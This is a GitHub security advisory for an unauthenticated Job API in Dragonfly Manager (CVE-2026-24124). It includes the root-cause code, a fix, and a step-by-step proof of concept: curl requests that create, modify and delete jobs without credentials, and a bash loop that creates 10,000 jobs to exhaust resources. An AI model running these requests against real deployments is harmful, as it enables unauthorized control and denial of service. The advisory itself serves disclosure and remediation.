# [H] Dragonfly Manager Job API Unauthenticated Access

## Summary
Severity: High
Advisory: GHSA-j8hf-cp34-g4j7
CVE: CVE-2026-24124
CWE: CWE-306
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P (CVSS_V4)
Published: 2026-01-22
Source: https://github.com/advisories/GHSA-j8hf-cp34-g4j7
Type: github-advisory

## Affected
- Go: `d7y.io/dragonfly/v2` — affected >=0 <2.4.1

## Details
## Summary

Dragonfly Manager's Job REST API endpoints lack authentication, allowing unauthenticated attackers to create, query, modify, and delete jobs, potentially leading to resource exhaustion, information disclosure, and service disruption.

## Affected Products

- **Product**: Dragonfly
- **Component**: Manager (REST API)
- **Affected Versions**: v2.x (based on source code analysis, including v2.4.0)
- **Affected Endpoints**: `/api/v1/jobs`

## Vulnerability Details

### Description

Dragonfly Manager's Job API endpoints (`/api/v1/jobs`) lack JWT authentication middleware and RBAC authorization checks in the routing configuration. This allows any unauthenticated user with access to the Manager API to perform the following operations:

1. **List all jobs** (GET `/api/v1/jobs`)
2. **Create new jobs** (POST `/api/v1/jobs`)
3. **Query job details** (GET `/api/v1/jobs/:id`)
4. **Modify jobs** (PATCH `/api/v1/jobs/:id`)
5. **Delete jobs** (DELETE `/api/v1/jobs/:id`)

### Technical Root Cause

In the source code file `manager/router/router.go` at lines 204-211, the Job API route group lacks authentication middleware:

```go
// TODO Add auth to the following routes and fix the tests.
// Job.
job := apiv1.Group("/jobs")
job.POST("", middlewares.CreateJobRateLimiter(limiter), h.CreateJob)
job.DELETE(":id", h.DestroyJob)
job.PATCH(":id", h.UpdateJob)
job.GET(":id", h.GetJob)
job.GET("", h.GetJobs)
```

In contrast, other API endpoints (such as `/clusters`) are correctly configured with authentication:

```go
// manager/router/router.go:143
c := apiv1.Group("/clusters", jwt.MiddlewareFunc(), rbac)
```

The developer left a TODO comment in the code, indicating this is a known but unresolved issue.

## Proof of Concept

### Environment Setup

#### Prerequisites
- Kubernetes cluster (Kind/Minikube/GKE, etc.)
- Helm 3.8.0+
- kubectl
- curl and jq

#### Deployment Steps

1. **Add Dragonfly Helm Repository**
```bash
helm repo add dragonfly https://dragonflyoss.github.io/helm-charts/
helm repo update
```

2. **Generate Deployment Manifest**
```bash
helm template dragonfly dragonfly/dragonfly \
  --namespace dragonfly-system \
  --set manager.replicas=1 \
  --set scheduler.replicas=1 \
  --set seedClient.replicas=1 \
  --set client.enable=false > /tmp/dragonfly-manifest.yaml
```

3. **Deploy to Kubernetes**
```bash
kubectl create namespace dragonfly-system
kubectl apply -f /tmp/dragonfly-manifest.yaml -n dragonfly-system
kubectl -n dragonfly-system wait --for=condition=Ready pods --all --timeout=600s
```

**Expected Output**:
```
namespace/dragonfly-system created
[... resource creation messages ...]
pod/dragonfly-manager-5cc788d64b-grpbk condition met
pod/dragonfly-mysql-0 condition met
pod/dragonfly-redis-master-0 condition met
pod/dragonfly-scheduler-0 condition met
pod/dragonfly-seed-client-0 condition met
```

4. **Setup Port Forwarding**
```bash
kubectl -n dragonfly-system port-forward svc/dragonfly-manager 8080:8080 &
```

### Exploitation Steps

#### Step 1: Verify Unauthenticated Access

**Command**:
```bash
curl -s -X GET http://localhost:8080/api/v1/jobs
```

**Actual Output**:
```json
[]
```

**HTTP Status Code**: `200 OK`

**Analysis**: The API returns a successful response instead of `401 Unauthorized`, confirming the lack of authentication.

#### Step 2: Create Unauthorized Job

**Command**:
```bash
curl -s -X POST http://localhost:8080/api/v1/jobs \
  -H "Content-Type: application/json" \
  -d '{
    "type": "preheat",
    "args": {
      "type": "file",
      "url": "http://example.com/test-file.txt"
    },
    "scheduler_cluster_ids": [1]
  }' | jq .
```

**Actual Output**:
```json
{
  "id": 2,
  "created_at": "2026-01-17T16:34:22.497Z",
  "updated_at": "2026-01-17T16:34:22.497Z",
  "task_id": "group_dd5565a2-686a-4c10-ad08-f5ce2950e1c9",
  "type": "preheat",
  "state": "PENDING",
  "args": {
    "type": "file",
    "url": "http://example.com/test-file.txt",
    "scope": "single_seed_peer",
    "timeout": 3600000000000
  },
  "user_id": 0,
  "scheduler_clusters": [
    {
      "id": 1,
      "name": "cluster-1",
      "is_default": true
    }
  ]
}
```

**HTTP Status Code**: `200 OK`

**Analysis**: Successfully created a Job (ID: 2) without any authentication token.

#### Step 3: Query Job Details

**Command**:
```bash
curl -s -X GET http://localhost:8080/api/v1/jobs/2 | jq '.id, .type, .state'
```

**Actual Output**:
```json
2
"preheat"
"PENDING"
```

**HTTP Status Code**: `200 OK`

#### Step 4: Modify Job

**Command**:
```bash
curl -s -X PATCH http://localhost:8080/api/v1/jobs/2 \
  -H "Content-Type: application/json" \
  -d '{"bio": "Modified by unauthenticated attacker"}' | jq '.id, .bio'
```

**Actual Output**:
```json
2
"Modified by unauthenticated attacker"
```

**HTTP Status Code**: `200 OK`

#### Step 5: Delete Job

**Command**:
```bash
curl -s -o /dev/null -w "%{http_code}" -X DELETE http://localhost:8080/api/v1/jobs/2
```

**Actual Output**:
```
200
```

**HTTP Status Code**: `200 OK`

#### Step 6: Comparison Test - Authenticated Endpoint

**Command**:
```bash
curl -s -X GET http://localhost:8080/api/v1/clusters | jq .
```

**Actual Output**:
```json
{
  "message": "Unauthorized"
}
```

**HTTP Status Code**: `401 Unauthorized`

**Analysis**: This proves that the authentication mechanism itself is working correctly; only the Job API endpoints are missing the configuration.

### Automated POC Script

Complete automated verification script available at:
- Script: `poc.sh`
- Output Log: `poc_output.log`

**Execution Summary**:
```
[Test 1] GET /api/v1/jobs - HTTP 200  VULNERABLE
[Test 2] POST /api/v1/jobs - HTTP 200  VULNERABLE (Job ID: 2)
[Test 3] GET /api/v1/jobs/2 - HTTP 200  VULNERABLE
[Test 4] PATCH /api/v1/jobs/2 - HTTP 200  VULNERABLE
[Test 5] DELETE /api/v1/jobs/2 - HTTP 200  VULNERABLE
[Test 6] GET /api/v1/clusters - HTTP 401  EXPECTED (comparison test)
```

## Impact Analysis

### Direct Impact

1. **Unauthorized Job Management**: Attackers can fully control the Job lifecycle (CRUD operations)
2. **Information Disclosure**: Can query all jobs, potentially exposing internal URLs, configurations, and business logic
3. **Service Disruption**: Can delete legitimate jobs, affecting normal file distribution services
4. **Resource Exhaustion**: Can create massive numbers of jobs leading to system resource exhaustion (DoS)

### Potential Attack Scenarios

1. **Resource Exhaustion Attack**
```bash
# Create 10,000 jobs to exhaust resources
for i in $(seq 1 10000); do
  curl -X POST http://manager:8080/api/v1/jobs \
    -H "Content-Type: application/json" \
    -d "{\"type\":\"preheat\",\"args\":{\"type\":\"file\",\"url\":\"http://example.com/file-${i}.txt\"},\"scheduler_cluster_ids\":[1]}" &
done
```

2. **SSRF Risk**: Through the URL parameter of Preheat jobs, SSRF attacks may be triggered (although there is SafeDialer protection, risks still exist)

3. **Business Logic Disruption**: Delete or modify critical jobs, affecting CDN preheating and file distribution functionality

### Affected Deployment Scenarios

- Manager API exposed on the public internet or untrusted networks
- Malicious users or compromised systems in internal networks
- Tenant isolation failures in multi-tenant environments

## Remediation

### Recommended Fix

Add authentication and authorization middleware to the Job API in the `manager/router/router.go` file:

```go
// Before Fix (lines 204-211)
job := apiv1.Group("/jobs")
job.POST("", middlewares.CreateJobRateLimiter(limiter), h.CreateJob)
job.DELETE(":id", h.DestroyJob)
job.PATCH(":id", h.UpdateJob)
job.GET(":id", h.GetJob)
job.GET("", h.GetJobs)

// After Fix
job := apiv1.Group("/jobs", jwt.MiddlewareFunc(), rbac)
job.POST("", middlewares.CreateJobRateLimiter(limiter), h.CreateJob)
job.DELETE(":id", h.DestroyJob)
job.PATCH(":id", h.UpdateJob)
job.GET(":id", h.GetJob)
job.GET("", h.GetJobs)
```

### Temporary Mitigation

Before the fix is released, the following mitigation measures can be taken:

1. **Network Isolation**: Restrict network access to the Manager API
   - Use firewall rules to limit source IPs
   - Only allow trusted internal networks to access
   - Use Kubernetes NetworkPolicy to restrict Pod-to-Pod communication

2. **API Gateway**: Deploy an API gateway in front of Manager for authentication
   - Use reverse proxies like Nginx/Kong/Traefik
   - Configure OAuth2/JWT validation

3. **Monitoring and Alerting**: Monitor abnormal access patterns to Job API
   - Log all Job API calls
   - Set up alerts for abnormal job creation/deletion

### Verify Fix

After the fix, all unauthenticated requests should return `401 Unauthorized`:

```bash
curl -s -X GET http://localhost:8080/api/v1/jobs
```

**Expected Output**:
```json
{
  "message": "Unauthorized"
}
```

## Appendix: Complete Verification Logs

### Deployment Verification Logs

```bash
$ kubectl -n dragonfly-system get pods
NAME                                 READY   STATUS    RESTARTS   AGE
dragonfly-manager-5cc788d64b-grpbk   1/1     Running   0          5m
dragonfly-mysql-0                    1/1     Running   0          5m
dragonfly-redis-master-0             1/1     Running   0          5m
dragonfly-redis-replicas-0           1/1     Running   0          5m
dragonfly-scheduler-0                1/1     Running   0          5m
dragonfly-seed-client-0              1/1     Running   0          5m

$ kubectl -n dragonfly-system get svc dragonfly-manager
NAME                TYPE        CLUSTER-IP      EXTERNAL-IP   PORT(S)              AGE
dragonfly-manager   ClusterIP   10.96.240.126   <none>        8080/TCP,65003/TCP   5m
```

### POC Execution Complete Logs

See `poc_output.log` file for details.
```
==========================================
VUL-001: Job API Unauthenticated Access POC
==========================================

[Test 1] GET /api/v1/jobs (No Authentication)
HTTP Status: 200
Response: []
✅ VULNERABLE: Endpoint accessible without authentication

[Test 2] POST /api/v1/jobs (No Authentication)
HTTP Status: 200
Job ID: 2
✅ VULNERABLE: Job created without authentication

[Test 3] GET /api/v1/jobs/2 (No Authentication)
HTTP Status: 200
✅ VULNERABLE: Job details accessible without authentication

[Test 4] PATCH /api/v1/jobs/2 (No Authentication)
HTTP Status: 200
✅ VULNERABLE: Job updated without authentication

[Test 5] DELETE /api/v1/jobs/2 (No Authentication)
HTTP Status: 200
✅ VULNERABLE: Job deleted without authentication

[Test 6] GET /api/v1/clusters (Should Require Authentication)
HTTP Status: 401
Response: {"message":"Unauthorized"}
✅ EXPECTED: Endpoint correctly requires authentication

==========================================
POC Execution Complete
==========================================

```
---

## Patches

- Dragonfy v2.4.1 and above.

## Workarounds

There are no effective workarounds, beyond upgrading.

## References
- https://github.com/dragonflyoss/dragonfly/security/advisories/GHSA-j8hf-cp34-g4j7
- https://nvd.nist.gov/vuln/detail/CVE-2026-24124
- https://github.com/dragonflyoss/dragonfly/commit/9fb9a2dfde3100f32dc7f48eabee4c2b64eac55f
- https://github.com/dragonflyoss/dragonfly
